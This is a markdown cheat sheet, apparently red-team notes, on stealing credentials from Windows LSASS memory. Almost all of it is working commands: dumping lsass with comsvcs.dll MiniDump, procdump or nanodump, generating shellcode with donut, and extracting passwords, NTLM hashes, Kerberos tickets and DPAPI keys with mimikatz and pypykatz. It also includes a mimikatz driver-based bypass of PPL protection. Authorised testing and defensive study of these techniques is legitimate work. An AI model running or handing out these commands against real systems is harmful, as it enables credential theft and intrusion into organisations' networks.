# 🔓 LSASS

- Cache credentials locally in memory
- Create access tokens
- Enforce security policies
- Write to Windows' security log

## mimikatz

- [mimikatz (release)](https://github.com/gentilkiwi/mimikatz/releases)

### Dump methods

**GUI** : Task Manager > lsass.exe > Create dump file

::: code-group

```cmd [cmd]
tasklist /svc # get PID
rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\lsass.dmp full
```

```powershell [PowerShell]
Get-Process lsass # get PID
rundll32 C:\windows\system32\comsvcs.dll, MiniDump $PID C:\lsass.dmp full
```

```cmd [Alternative (procdump)]
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

:::

### Privileges required

- Local Administrator (or SYSTEM)
- PPL (Protected Process Light) may block dumping on Windows 10/11 -> see [PPL bypass](#ppl-bypass-windows-1011)

### Live parsing (no dump file)

```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords
```

### Check if PPL is enabled

```powershell
Get-Process lsass | Select-Object ProcessName, @{Name='Protected';Expression={$_.ProtectedProcess}}
```

### Extract credentials from dump

::: code-group

```bash [nanodump]
# Generate shellcode
donut -f nanodump.x64.exe -o payload.bin -a 2

# Basic dump
nanodump.x64.exe --write C:\temp\lsass.dmp

# PPL bypass (requires signed driver)
nanodump.x64.exe --ppl --write lsass.dmp
```

```bash [pypykatz]
pypykatz lsa minidump lsass.dmp --quiet
pypykatz lsa minidump lsass.dmp | grep -i "ntlm" # NTLM only
```

```bash [mimikatz]
sekurlsa::minidump C:\lsass.dmp # select lsass.dmp
sekurlsa::logonPasswords        # extract password

sekurlsa::tickets      # Kerberos tickets
sekurlsa::msv          # LM/NTLM hashes only
dpapi::masterkey       # DPAPI master keys
```

:::

### PPL bypass (Windows 10/11)

```bash
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # privilege::debug
mimikatz # sekurlsa::logonPasswords
```
